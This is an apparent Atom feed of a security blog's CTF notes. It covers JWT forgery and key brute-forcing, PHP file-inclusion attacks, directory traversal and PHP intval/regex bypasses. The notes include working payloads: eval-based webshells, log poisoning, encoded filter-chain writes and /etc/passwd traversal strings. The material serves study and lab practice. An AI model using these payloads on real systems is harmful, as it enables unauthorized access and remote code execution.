<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>4CH4N ZKUAN</title>
  
  <subtitle>-</subtitle>
  <link href="https://whoiszkuan.github.io/atom.xml" rel="self"/>
  
  <link href="https://whoiszkuan.github.io/"/>
  <updated>2022-01-22T13:23:49.366Z</updated>
  <id>https://whoiszkuan.github.io/</id>
  
  <author>
    <name>zkuan</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>JsonWebToken(JWT)</title>
    <link href="https://whoiszkuan.github.io/2022/01/22/JsonWebToken-JWT/"/>
    <id>https://whoiszkuan.github.io/2022/01/22/JsonWebToken-JWT/</id>
    <published>2022-01-22T13:22:22.000Z</published>
    <updated>2022-01-22T13:23:49.366Z</updated>
    
    <content type="html"><![CDATA[<h1 id="JWT攻击"><a href="#JWT攻击" class="headerlink" title="JWT攻击"></a>JWT攻击</h1><p>JSON Web Token(JWT)是目前最流行的跨域认证解决方案。遵循JSON格式，将用户信息加密到token里，服务器不保存如何用户信息，只保存密钥信息，通过特定加密算法验证token，通过token验证用户身份。可替代传统cookie+session。</p><h2 id="JWT令牌结构"><a href="#JWT令牌结构" class="headerlink" title="JWT令牌结构"></a>JWT令牌结构</h2><p><img src="https://gitee.com/zku4n/picgo/raw/master/img/jwt_token.png" alt="智威汤逊"></p><p>令牌均采用Base64编码，且由三部分组成：</p><ul><li>header</li><li>payload</li><li>signature</li></ul><p>三段加密字符串通过<code>.</code>拼接起来生成了JWT的token。</p><ul><li>base64url加密是先做base64加密，然后再将 <code>-</code> 替代 <code>+</code> 及 <code>_</code> 替代 <code>/</code> 。</li></ul><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">JWT 规定了7个官方字段，供选用iss (issuer)：签发人exp (expiration time)：过期时间sub (subject)：主题aud (audience)：受众nbf (Not Before)：生效时间iat (Issued At)：签发时间jti (JWT ID)：编号<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><h2 id="认证流程"><a href="#认证流程" class="headerlink" title="认证流程"></a>认证流程</h2><p><img src="https://gitee.com/zku4n/picgo/raw/master/img/image-20191112150846485.png" alt="img"></p><h2 id="安全问题"><a href="#安全问题" class="headerlink" title="安全问题"></a>安全问题</h2><p>1.修改算法为none<br>2.修改算法从RS256到HS256<br>3.信息泄漏 密钥泄漏<br>4.爆破密钥</p><h2 id="无加密"><a href="#无加密" class="headerlink" title="无加密"></a>无加密</h2><p>根据TIPS，我们要访问<code>/admin/</code>文件夹</p><p>访问时发现cookie中携带有jwt格式的token</p><p><code>eyJhbGciOiJOb25lIiwidHlwIjoiand0In0.W3siaXNzIjoiYWRtaW4iLCJpYXQiOjE2NDIzODY5MDksImV4cCI6MTY0MjM5NDEwOSwibmJmIjoxNjQyMzg2OTA5LCJzdWIiOiJ1c2VyIiwianRpIjoiNzkwYWZjNzE2ODQwNmJlZWNhNDExNTdkNjMzM2IwMmEifV0</code></p><p>使用<code>jwt.io</code>发现加密为None，因此只要将<code>sub</code>的值修改为<code>admin</code>再加密即可。</p><p><code>eyJhbGciOiJOb25lIiwidHlwIjoiand0In0A.W3siaXNzIjoiYWRtaW4iLCJpYXQiOjE2NDIzODY5MDksImV4cCI6MTY0MjM5NDEwOSwibmJmIjoxNjQyMzg2OTA5LCJzdWIiOiJhZG1pbiIsImp0aSI6Ijc5MGFmYzcxNjg0MDZiZWVjYTQxMTU3ZDYzMzNiMDJhIn1d</code></p><p>携带着这个cookie访问<code>admin</code>即可</p><h2 id="算法修改"><a href="#算法修改" class="headerlink" title="算法修改"></a>算法修改</h2><p>JWT支持将算法设定为”none”，如果将”alg”字段设为”none”，那么签名将会置空，将签名置空将可以伪造任何想要的token。</p><p>使用python进行jwt编码：</p><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python">import jwttoken_dict &#x3D; &#123;  &quot;iss&quot;: &quot;admin&quot;,  &quot;iat&quot;: 1642391959,  &quot;exp&quot;: 1642399159,  &quot;nbf&quot;: 1642391959,  &quot;sub&quot;: &quot;admin&quot;,  &quot;jti&quot;: &quot;e80ebdc089f5347ebe9d6afedc252a73&quot;&#125;headers &#x3D; &#123;  &quot;alg&quot;: &quot;none&quot;,  &quot;typ&quot;: &quot;JWT&quot;  &#125;jwt_token &#x3D; jwt.encode(token_dict,&quot;&quot;,algorithm&#x3D;&quot;none&quot;,headers&#x3D;headers)print(jwt_token)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><ul><li>小坑：<code>headers</code>中的<code>alg</code>为<code>none</code>，在encode时，<code>algorithm</code>也必须为<code>none</code>均为小写</li></ul><h2 id="HS256密钥爆破"><a href="#HS256密钥爆破" class="headerlink" title="HS256密钥爆破"></a>HS256密钥爆破</h2><p><img src="https://gitee.com/zku4n/picgo/raw/master/img/image-20220117130007298.png" alt="image-20220117130007298"></p><p>解码得算法为<code>HS256</code></p><p>可通过工具对其进行爆破：</p><p><a href="https://github.com/brendan-rius/c-jwt-cracker">brendan-rius/c-jwt-cracker: JWT brute force cracker written in C (github.com)</a></p><p>或者自己写脚本爆破：</p><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python">import jwttoken &#x3D; &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY0MjM5NDIxNSwiZXhwIjoxNjQyNDAxNDE1LCJuYmYiOjE2NDIzOTQyMTUsInN1YiI6InVzZXIiLCJqdGkiOiJkZmU5NzZmOGY3NDlhZDQ4ODk5ZjVjNTgwZDM2NmU3ZCJ9.dSpJxOw7fTEeHqGRMehKrpUypITCYL8tXBsWXkhZSKA&quot;passwd &#x3D; &quot;E:\zkuan\PythonHacker\passwd.txt&quot;with open(passwd) as file:    for line in file:        line &#x3D; line.strip()        try:            jwt.decode(token,verify&#x3D;True,key&#x3D;line,algorithms&#x3D;&quot;HS256&quot;)            print(&quot;key:&quot;,line)            break        except (jwt.exceptions.ExpiredSignatureError,jwt.exceptions.InvalidAlgorithmError,jwt.exceptions.InvalidIssuedAtError,jwt.exceptions.ImmatureSignatureError):            print(&quot;key:&quot;,line)            break        except jwt.exceptions.InvalidSignatureError:            print(&quot;Failed&quot;,line)            continue    else:        print(&quot;NOT FOUND&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p>将token设为自己的token值，设置自己的字典路径，即可进行爆破。</p><p>将爆破出来的密钥填写进去，修改<code>sub</code>为<code>admin</code>，编码后携带此cookie访问目标。</p><h2 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h2><p>使用<code>jwtcrack</code>进行爆破</p><p><code>./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY0MjM5NjIyMywiZXhwIjoxNjQyNDAzNDIzLCJuYmYiOjE2NDIzOTYyMjMsInN1YiI6InVzZXIiLCJqdGkiOiI4YmVlNTBiMjRiOGYwY2M4NzAzYmZhMzVjNTUxYTQ4NyJ9.N4EmgLhTvprtFfMV4WZkX0TLkJYckUnY-iI8czZ_IDg</code></p><p><img src="https://gitee.com/zku4n/picgo/raw/master/img/image-20220117131242876.png" alt="image-20220117131242876"></p><p>爆破出密钥<code>aaab</code></p><h2 id="公私钥泄露"><a href="#公私钥泄露" class="headerlink" title="公私钥泄露"></a>公私钥泄露</h2><p>根据提示，</p><div class="code-wrapper"><pre class="line-numbers language-json" data-language="json"><code class="language-json">&#x2F;* GET home page. *&#x2F;router.get(&#39;&#x2F;&#39;, function(req, res, next) &#123;  res.type(&#39;html&#39;);  var privateKey &#x3D; fs.readFileSync(process.cwd()+&#39;&#x2F;&#x2F;public&#x2F;&#x2F;private.key&#39;);  var token &#x3D; jwt.sign(&#123; user: &#39;user&#39; &#125;, privateKey, &#123; algorithm: &#39;RS256&#39; &#125;);  res.cookie(&#39;auth&#39;,token);  res.end(&#39;where is flag?&#39;);  &#125;);router.post(&#39;&#x2F;&#39;,function(req,res,next)&#123;var flag&#x3D;&quot;flag_here&quot;;res.type(&#39;html&#39;);var auth &#x3D; req.cookies.auth;var cert &#x3D; fs.readFileSync(process.cwd()+&#39;&#x2F;&#x2F;public&#x2F;public.key&#39;);  &#x2F;&#x2F; get public keyjwt.verify(auth, cert, function(err, decoded) &#123;  if(decoded.user&#x3D;&#x3D;&#x3D;&#39;admin&#39;)&#123;  res.end(flag);  &#125;else&#123;  res.end(&#39;you are not admin&#39;);  &#125;&#125;);&#125;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p>为公私钥泄露，访问<code>/public.key</code>和<code>/private.key</code>将公私钥下载下来。</p><p>本地搭建环境进行测试</p><p>创建环境结构：<code>npx express-generator</code></p><p><img src="https://gitee.com/zku4n/picgo/raw/master/img/image-20220120115140619.png" alt="image-20220120115140619"></p><p>将源码进行修改，并将公私钥放入<code>/public</code>目录下。</p><p>使用<code>npm start</code>启动测试环境</p><p>所得到的cookie就是带有私钥的admin权限的cookie。</p><p>将生成的cookie放入靶场cookie内进行post请求。</p><h2 id="密钥混淆攻击"><a href="#密钥混淆攻击" class="headerlink" title="密钥混淆攻击"></a>密钥混淆攻击</h2><h3 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h3><blockquote><p>RS256(采用SHA-256的RSA签名)，是一种非对称算法，使用公私钥对：标识提供方采用私钥生成签名，使用方获取公钥以验证签名。由于公钥与私钥相比不需要保护，因此大多数标识提供方使其易于使用方获取和使用(通常通过一个元数据URL。)</p><p>另外一方面，HS256(带有SHA-256的HMAC是一种对称算法，双方共享一个密钥，使用相同的密钥生成签名和验证签名)，因此，如果公钥泄露，可使用HS256进行密钥混淆攻击。</p></blockquote><p>由于公钥通常可以从元数据URL节点获得，因此可以对客户端进行编程以自动检索公钥。如果采用这种方式，从服务器上直接下载公钥信息，可以有效减少配置信息。</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>某些库对签名/验证HMAC对称加密的密钥和包含用于验证RSA签名令牌的公钥的密钥使用相同的变量名。</p><p>通过将算法调整为HMAC变体(HS256/HS384/HS512)并使用公共可用公钥对其进行签名，我们可以欺骗服务使用变量中的硬编码公钥验证HMAC令牌。</p><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p><img src="https://gitee.com/zku4n/picgo/raw/master/img/image-20220120174847610.png" alt="image-20220120174847610"></p><p>将<code>user</code>改为<code>admin</code>，算法<code>RS256</code>修改为<code>HS256</code>，使用HS256算法验证签名。</p>]]></content>
    
    
    <summary type="html">Fxxking JWT</summary>
    
    
    
    <category term="WebSec" scheme="https://whoiszkuan.github.io/categories/WebSec/"/>
    
    
    <category term="Security" scheme="https://whoiszkuan.github.io/tags/Security/"/>
    
    <category term="Web" scheme="https://whoiszkuan.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>File Include</title>
    <link href="https://whoiszkuan.github.io/2022/01/10/File-Include/"/>
    <id>https://whoiszkuan.github.io/2022/01/10/File-Include/</id>
    <published>2022-01-10T13:18:47.000Z</published>
    <updated>2022-01-22T13:26:13.109Z</updated>
    
    <content type="html"><![CDATA[<h1 id="文件包含函数"><a href="#文件包含函数" class="headerlink" title="文件包含函数"></a>文件包含函数</h1><ul><li>Include</li><li>Include_once</li><li>require</li><li>require_once</li><li>hightlight_file,show_source,readfile,file_get_contents,fopen,file</li></ul><h1 id="利用方式-伪协议"><a href="#利用方式-伪协议" class="headerlink" title="利用方式-伪协议"></a>利用方式-伪协议</h1><table><thead><tr><th align="left">协议</th><th>测试PHP版本</th><th>allow_url_fopen</th><th align="left">allow_url_include</th><th>用法</th></tr></thead><tbody><tr><td align="left">file://</td><td>&gt;=5.2</td><td>off/on</td><td align="left">off/on</td><td>?file=file://D:/soft/phpStudy/WWW/phpcode.txt</td></tr><tr><td align="left">php://filter</td><td>&gt;=5.2</td><td>off/on</td><td align="left">off/on</td><td>?file=php://filter/read=convert.base64-encode/resource=./index.php</td></tr><tr><td align="left">php://input</td><td>&gt;=5.2</td><td>off/on</td><td align="left">on</td><td>?file=php://input [POST DATA] &lt;?php phpinfo()?&gt;</td></tr><tr><td align="left">zip://</td><td>&gt;=5.2</td><td>off/on</td><td align="left">off/on</td><td>?file=zip://D:/sort/phpStudy/WWW/file.zip%23phpcode.txt</td></tr><tr><td align="left">compress.bzip2://</td><td>&gt;=5.2</td><td>off/on</td><td align="left">off/on</td><td>?file=compress.bzip2://D:/soft/phpstudy/WWW/file.bz2<br />[or] <br />?file=compress.bzip2://./file.bz2</td></tr><tr><td align="left">compress.zlib://</td><td>&gt;=5.2</td><td>off/on</td><td align="left">off/on</td><td>?file=compress.zlib://D:/soft/phpstudy/WWW/file.gz<br />[or]<br />?file=compress.zlib://./file.gz</td></tr><tr><td align="left">data://</td><td>&gt;=5.2</td><td>on</td><td align="left">on</td><td>?file=data://text/plain,&lt;?php phpinfo()?&gt;<br />?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs=<br />?file=data:text/plain,&lt;?php phpinfo()?&gt;<br />?file=data:text/plain;base64.PDFfasdfDFsdSF=</td></tr></tbody></table><p>php://filter是一种元封装器，设计用于数据流打开时的筛选过滤应用</p><p>data://同样类似于php://input，可以让用户来控制输入流</p><p>php://input可以访问请求的原始数据的只读流，将post请求的数据当做php代码执行</p><p>phar://xxx.png/shell.php解压缩包的一个函数，不管后缀是什么，都会当做压缩包来解压</p><h1 id="无过滤文件包含"><a href="#无过滤文件包含" class="headerlink" title="无过滤文件包含"></a>无过滤文件包含</h1><p>通过<code>../</code>返回上一级目录查找敏感文件</p><p><code>http://127.0.0.1:8081/LFI-1/?page=../phpinfo.php</code></p><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">if(isset($_GET[&#39;file&#39;]))&#123;    $file &#x3D; $_GET[&#39;file&#39;];    include($file);&#125;else&#123;    highlight_file(__FILE__);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p>无过滤，利用<code>php://filter</code></p><p><code>?file=php://filter/read=convert.base64-encode/resource=flag.php</code></p><p>也可使用<code>data://</code></p><p><code>?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs=</code></p><p><code>?file=data://text/plain,&lt;?php system(&#39;cat flag.php&#39;)?&gt;</code></p><h1 id="PHP关键字过滤"><a href="#PHP关键字过滤" class="headerlink" title="PHP关键字过滤"></a>PHP关键字过滤</h1><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">if(isset($_GET[&#39;file&#39;]))&#123;    $file &#x3D; $_GET[&#39;file&#39;];    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);    include($file);&#125;else&#123;    highlight_file(__FILE__);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p>代码中将PHP过滤替换为???</p><p>使用<code>data://</code></p><p><code>?file=data://text/plain,&lt;?= system(&#39;tac flag.php&#39;);?&gt;</code></p><p><code>?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg==</code></p><p>写一句话木马：</p><p><code>?file=data://text/plain,&lt;?= eval($_POST[1]);?&gt;</code></p><p>POST参数<code>1=phpinfo();</code></p><h1 id="日志文件包含"><a href="#日志文件包含" class="headerlink" title="日志文件包含"></a>日志文件包含</h1><p>知道日志文件的存放路径，通过User-Agent插入payload</p><p>include加载的文件都会当做PHP进行解析。如果文件中有PHP代码，就会执行PHP代码。不是PHP代码的部分就会直接输出。</p><p>Nginx的日志文件是/var/log/nginx/access.log，对服务器的请求都会记录到日志文件中去，所以构造一个有马的请求(<code>&lt;?php eval($_POST[1]);?&gt;</code>)，再用file包含日志文件。所以就可以执行拿到shell了。</p><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">if(isset($_GET[&#39;file&#39;]))&#123;    $file &#x3D; $_GET[&#39;file&#39;];    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);    $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);    include($file);&#125;else&#123;    highlight_file(__FILE__);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p>日志文件路径：<code>?file=/var/log/nginx/access.log</code></p><p><img src="https://gitee.com/zku4n/picgo/raw/master/img/2021-11-24_10-442021-11-24.png"></p><h1 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h1><h1 id="die绕过"><a href="#die绕过" class="headerlink" title="die绕过"></a>die绕过</h1><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">if(isset($_GET[&#39;file&#39;]))&#123;    $file &#x3D; $_GET[&#39;file&#39;];    $content &#x3D; $_POST[&#39;content&#39;];    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);    $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);    $file &#x3D; str_replace(&quot;:&quot;, &quot;???&quot;, $file);    $file &#x3D; str_replace(&quot;.&quot;, &quot;???&quot;, $file);    file_put_contents(urldecode($file), &quot;&lt;?php die(&#39;大佬别秀了&#39;);?&gt;&quot;.$content);    &#125;else&#123;    highlight_file(__FILE__);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><blockquote><p>GET<br>file=%2570%2568%2570%253a%252f%252f%2566%2569%256c%2574%2565%2572%252f%2577%2572%2569%2574%2565%253d%2563%256f%256e%2576%2565%2572%2574%252e%2562%2561%2573%2565%2536%2534%252d%2564%2565%2563%256f%2564%2565%252f%2572%2565%2573%256f%2575%2572%2563%2565%253d%2561%252e%2570%2568%2570<br>// file=php://filter/write=convert.base64-decode/resource=a.php<br>POST<br>content=11PD9waHAgZXZhbCgkX1BPU1RbMV0pOw==<br>其中PD9waHAgZXZhbCgkX1BPU1RbMV0pOw==是”<?php eval($_POST[1]);"的base64编码。前面的11是为了填充"<?php die('大佬别秀了');?>“<br>base64 4位4位解码，其中”<?php die('大佬别秀了');?>“解码的内容其实只有phpdie，所以需要再填充两位。<br>//content=&lt;?php eval($_POST[1]);</p></blockquote><h1 id="data-base64绕过"><a href="#data-base64绕过" class="headerlink" title="data base64绕过"></a>data base64绕过</h1><p><code>data://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbMV0pOw</code></p><p><code>PD9waHAgZXZhbCgkX1BPU1RbMV0pOw</code> 为<code>&lt;?php eval($_POST[1]);</code>的base64编码</p>]]></content>
    
    
    <summary type="html">File Include Base</summary>
    
    
    
    <category term="WebSec" scheme="https://whoiszkuan.github.io/categories/WebSec/"/>
    
    
    <category term="Security" scheme="https://whoiszkuan.github.io/tags/Security/"/>
    
    <category term="Web" scheme="https://whoiszkuan.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>Directory Traversal</title>
    <link href="https://whoiszkuan.github.io/2021/12/09/Directory-Traversal/"/>
    <id>https://whoiszkuan.github.io/2021/12/09/Directory-Traversal/</id>
    <published>2021-12-09T10:49:27.000Z</published>
    <updated>2021-12-10T01:57:34.702Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Directory-Traversal-目录穿越"><a href="#Directory-Traversal-目录穿越" class="headerlink" title="Directory Traversal(目录穿越)"></a>Directory Traversal(目录穿越)</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>目录穿越是一种Web漏洞，它允许黑客读取运行在服务器上的任意文件，包括应用程序代码、数据、后端系统凭据以及敏感文件等。</p><p>当图像通过HTML加载：<code>&lt;img src=&#39;/images?filename=218.png&#39;&gt;</code></p><p>网站使用<code>filename</code>加载图片文件并返回，图片本身存储在该磁盘上，可能存在<code>/var/www/images/</code>上，图片真实路径为<code>/var/www/images/218.png</code></p><p>如果当前网站没有针对目录穿越进行防御加固，黑客可在URL下检索服务器文件系统中的任意文件：</p><p><code>http://127.0.0.1/images?filename=../../../../etc/passwd</code></p><h2 id="绝对路径绕过"><a href="#绝对路径绕过" class="headerlink" title="绝对路径绕过"></a>绝对路径绕过</h2><p>当<code>../</code>被过滤时，可直接使用系统中根目录的绝对路径</p><p>payload：<code>/etc/passwd</code></p><h2 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h2><p>当<code>../</code>被直接替换为空时，可使用双写嵌套遍历序列</p><p><code>....// -&gt; ../</code>当中间<code>../</code>被替换为空时，<code>..  /</code>重新组合</p><p>payload:<code>http://127.0.0.1/images?filename=....//....//....//....//etc/passwd</code></p><h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><blockquote><p>. -&gt; %2c</p><p>/ -&gt; %2f</p><p>% -&gt; %25    (双重编码)</p></blockquote><p>payload:</p><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1&#x2F;images?filename&#x3D;..%2f..%2f..%2f..%2f..%2fetc&#x2F;passwdhttp:&#x2F;&#x2F;127.0.0.1&#x2F;images?filename&#x3D;%2c%2c%2f%2c%2c%2f%2c%2c%2f%2c%2c%2f%2c%2c%2fetc&#x2F;passwdhttp:&#x2F;&#x2F;127.0.0.1&#x2F;images?filename&#x3D;..%252f..%252f..%252f..%252f..%252fetc&#x2F;passwd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div><h2 id="预期文件配合"><a href="#预期文件配合" class="headerlink" title="预期文件配合"></a>预期文件配合</h2><p>当网站要求获取<code>filename=</code>图片时以预期的文件夹开头，例如<code>/var/www/images</code>，可配合<code>../</code>来返回上一级目录</p><p>payload:<code>http://127.0.0.1/images?filename=/var/www/images../../../etc/passwd</code></p><h2 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h2><p>当网站要求获取<code>filename=</code>图片时以预期的文件后缀结尾，例如<code>.png</code>，可使用空字节终止</p><p>payload:<code>http://127.0.0.1/images?filename=../../../../etc/passwd%00.png</code></p><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><p>防止文件路径遍历漏洞的最有效方法是完全避免将用户提供的输入传递给文件系统 API。可以重写执行此操作的许多应用程序函数，以更安全的方式提供相同的行为。</p><p>如果认为将用户提供的输入传递给文件系统 API 是不可避免的，那么应该同时使用两层防御来防止攻击：</p><ul><li>应用程序应在处理之前验证用户输入。理想情况下，验证应与允许值的白名单进行比较。如果这对于所需的功能是不可能的，则验证应验证输入是否仅包含允许的内容，例如纯字母数字字符。</li><li>验证提供的输入后，应用程序应将输入附加到基本目录，并使用平台文件系统 API 规范化路径。它应该验证规范化路径是否以预期的基本目录开头。</li></ul>]]></content>
    
    
    <summary type="html">目录穿越</summary>
    
    
    
    <category term="WebSec" scheme="https://whoiszkuan.github.io/categories/WebSec/"/>
    
    
    <category term="Security" scheme="https://whoiszkuan.github.io/tags/Security/"/>
    
    <category term="Web" scheme="https://whoiszkuan.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>PHP Security Features</title>
    <link href="https://whoiszkuan.github.io/2021/12/02/PHP-Security-Features/"/>
    <id>https://whoiszkuan.github.io/2021/12/02/PHP-Security-Features/</id>
    <published>2021-12-02T13:11:17.000Z</published>
    <updated>2021-12-21T03:28:23.233Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Web-89-数组绕过"><a href="#Web-89-数组绕过" class="headerlink" title="Web-89 数组绕过"></a>Web-89 数组绕过</h1><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#39;num&#39;]))&#123;    $num &#x3D; $_GET[&#39;num&#39;];    if(preg_match(&quot;&#x2F;[0-9]&#x2F;&quot;, $num))&#123;        die(&quot;no no no!&quot;);    &#125;    if(intval($num))&#123;        echo $flag;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p><code>preg_match</code>正则匹配<code>0-9</code>通过数组绕过</p><ul><li>payload：<code>?num[]=</code></li></ul><h1 id="Web-90-intval"><a href="#Web-90-intval" class="headerlink" title="Web-90 intval"></a>Web-90 intval</h1><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#39;num&#39;]))&#123;    $num &#x3D; $_GET[&#39;num&#39;];    if($num&#x3D;&#x3D;&#x3D;&quot;4476&quot;)&#123;        die(&quot;no no no!&quot;);    &#125;    if(intval($num,0)&#x3D;&#x3D;&#x3D;4476)&#123;        echo $flag;    &#125;else&#123;        echo intval($num,0);    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><h2 id="intval函数说明"><a href="#intval函数说明" class="headerlink" title="intval函数说明"></a>intval函数说明</h2><p>intval-获取变量的整数值</p><p><code>intval (mixed $var [,int $base=10]) : int</code></p><ul><li>var<ul><li>要转换成integer的数量值</li></ul></li><li>base<ul><li>转化所使用的进制</li></ul></li></ul><blockquote><p>如果base是0，通过监测var的格式来决定使用的进制</p><ul><li>如果字符串包括了”0x”或”0X”的前缀，使用16进制(hex)</li><li>如果字符串以”0”开始，使用8进制(octal)，否则将使用十进制。</li></ul></blockquote><p>通过使用指定的进制base转换（默认十进制），返回变量var的integer数值。intval()不能用于object，否则会产生E_NOTICE错误并返回1.</p><p>综上所述，要构造一个不强等于4476，又要使intval函数处理后的结果强等于4476：</p><p><code>?num=0x117c</code></p><p>or</p><p><code>?numb=4476a</code></p><h1 id="Web-91-0a绕过"><a href="#Web-91-0a绕过" class="headerlink" title="Web-91 %0a绕过"></a>Web-91 %0a绕过</h1><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">show_source(__FILE__);include(&#39;flag.php&#39;);$a&#x3D;$_GET[&#39;cmd&#39;];if(preg_match(&#39;&#x2F;^php$&#x2F;im&#39;, $a))&#123;    if(preg_match(&#39;&#x2F;^php$&#x2F;i&#39;, $a))&#123;        echo &#39;hacker&#39;;    &#125;    else&#123;        echo $flag;    &#125;&#125;else&#123;    echo &#39;nonononono&#39;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><table><thead><tr><th>修饰符</th><th>含义</th></tr></thead><tbody><tr><td>i</td><td>ignore-不区分大小写</td></tr><tr><td>g</td><td>global-全局匹配</td></tr><tr><td>m</td><td>multi line-多行匹配</td></tr><tr><td>s</td><td>特殊字符圆点 <code>.</code> 中包含换行符 <code>\n</code></td></tr></tbody></table><p>第一个<code>if</code>：匹配多行且不区分大小写，满足两个条件进入第二个判断</p><p>第二个<code>if</code>：区分大小写但只匹配单行，如果第一行不存在php则打印出flag。</p><p>综上所述：可使用换行符+字符串php，同时满足两个判断的条件，当第一个判断时，换行符+php为两行既多行，且能匹配到字符串php。进入第二个判断，第一行为换行符，即第一行为空不为php，所以输出flag</p><p><code>payload</code>:<code>?cmd=%0aphp</code></p><h1 id="Web-92-intval-八进制十六进制绕过"><a href="#Web-92-intval-八进制十六进制绕过" class="headerlink" title="Web-92 intval 八进制十六进制绕过"></a>Web-92 intval 八进制十六进制绕过</h1><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#39;num&#39;]))&#123;    $num &#x3D; $_GET[&#39;num&#39;];    if($num&#x3D;&#x3D;4476)&#123;        die(&quot;no no no!&quot;);    &#125;    if(intval($num,0)&#x3D;&#x3D;4476)&#123;        echo $flag;    &#125;else&#123;        echo intval($num,0);    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p>intval函数，可使用八进制(010574)或十六进制(0x117c)绕过</p><h1 id="Web-93-intval-八进制绕过"><a href="#Web-93-intval-八进制绕过" class="headerlink" title="Web-93 intval 八进制绕过"></a>Web-93 intval 八进制绕过</h1><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#39;num&#39;]))&#123;    $num &#x3D; $_GET[&#39;num&#39;];    if($num&#x3D;&#x3D;4476)&#123;        die(&quot;no no no!&quot;);    &#125;    if(preg_match(&quot;&#x2F;[a-z]&#x2F;i&quot;, $num))&#123;        die(&quot;no no no!&quot;);    &#125;    if(intval($num,0)&#x3D;&#x3D;4476)&#123;        echo $flag;    &#125;else&#123;        echo intval($num,0);    &#125;&#125;<span 